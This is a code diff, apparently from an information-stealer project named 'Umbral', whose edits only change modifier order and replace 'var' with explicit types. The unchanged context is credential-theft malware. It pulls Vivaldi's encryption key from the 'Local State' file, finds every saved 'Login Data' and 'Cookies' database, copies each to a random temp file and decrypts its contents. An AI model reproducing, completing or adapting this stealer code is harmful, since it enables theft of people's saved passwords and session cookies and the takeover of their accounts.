@@ -12,9 +12,9 @@ namespace Umbral.payload.Browsers
 {
     internal static class Vivaldi
     {
-        private static readonly string BrowserPath;
+        static private readonly string BrowserPath;
 
-        private static byte[] _encryptionKey;
+        static private byte[] _encryptionKey;
 
         static Vivaldi()
         {
@@ -24,22 +24,22 @@ namespace Umbral.payload.Browsers
             _encryptionKey = null;
         }
 
-        private static async Task<byte[]> GetEncryptionKey()
+        static private async Task<byte[]> GetEncryptionKey()
         {
             if (!(_encryptionKey is null)) return _encryptionKey;
 
             byte[] key = null;
 
-            var localStatePath = Path.Combine(BrowserPath, "Local State");
+            string localStatePath = Path.Combine(BrowserPath, "Local State");
             if (File.Exists(localStatePath))
                 try
                 {
                     string content;
 
-                    using (var fs = new FileStream(localStatePath, FileMode.Open, FileAccess.Read,
+                    using (FileStream fs = new FileStream(localStatePath, FileMode.Open, FileAccess.Read,
                                FileShare.ReadWrite))
                     {
-                        using (var reader = new StreamReader(fs))
+                        using (StreamReader reader = new StreamReader(fs))
                         {
                             content = await reader.ReadToEndAsync();
                         }
@@ -64,7 +64,7 @@ namespace Umbral.payload.Browsers
             return null;
         }
 
-        private static async Task<byte[]> DecryptData(byte[] buffer)
+        static private async Task<byte[]> DecryptData(byte[] buffer)
         {
             byte[] decryptedData = null;
             byte[] key = await GetEncryptionKey();
@@ -107,14 +107,14 @@ namespace Umbral.payload.Browsers
 
             if (Directory.Exists(BrowserPath) && !(await GetEncryptionKey() is null))
             {
-                var loginDataPaths = await Task.Run(() =>
+                string[] loginDataPaths = await Task.Run(() =>
                     Directory.GetFiles(BrowserPath, "Login Data", SearchOption.AllDirectories));
 
-                foreach (var loginDataPath in loginDataPaths)
+                foreach (string loginDataPath in loginDataPaths)
                     try
                     {
-                    retry:
-                        var tempLoginDataPath = Path.Combine(Path.GetTempPath(), Common.GenerateRandomString(15));
+                        retry:
+                        string tempLoginDataPath = Path.Combine(Path.GetTempPath(), Common.GenerateRandomString(15));
                         if (File.Exists(tempLoginDataPath)) goto retry;
 
                         File.Copy(loginDataPath, tempLoginDataPath);
@@ -156,14 +156,14 @@ namespace Umbral.payload.Browsers
 
             if (Directory.Exists(BrowserPath) && !(await GetEncryptionKey() is null))
             {
-                var cookiesFilePaths = await Task.Run(() =>
+                string[] cookiesFilePaths = await Task.Run(() =>
                     Directory.GetFiles(BrowserPath, "Cookies", SearchOption.AllDirectories));
 
-                foreach (var cookiesFilePath in cookiesFilePaths)
+                foreach (string cookiesFilePath in cookiesFilePaths)
                     try
                     {
-                    retry:
-                        var tempCookiesFilePath = Path.Combine(Path.GetTempPath(), Common.GenerateRandomString(15));
+                        retry:
+                        string tempCookiesFilePath = Path.Combine(Path.GetTempPath(), Common.GenerateRandomString(15));
                         if (File.Exists(tempCookiesFilePath)) goto retry;
 
                         File.Copy(cookiesFilePath, tempCookiesFilePath);
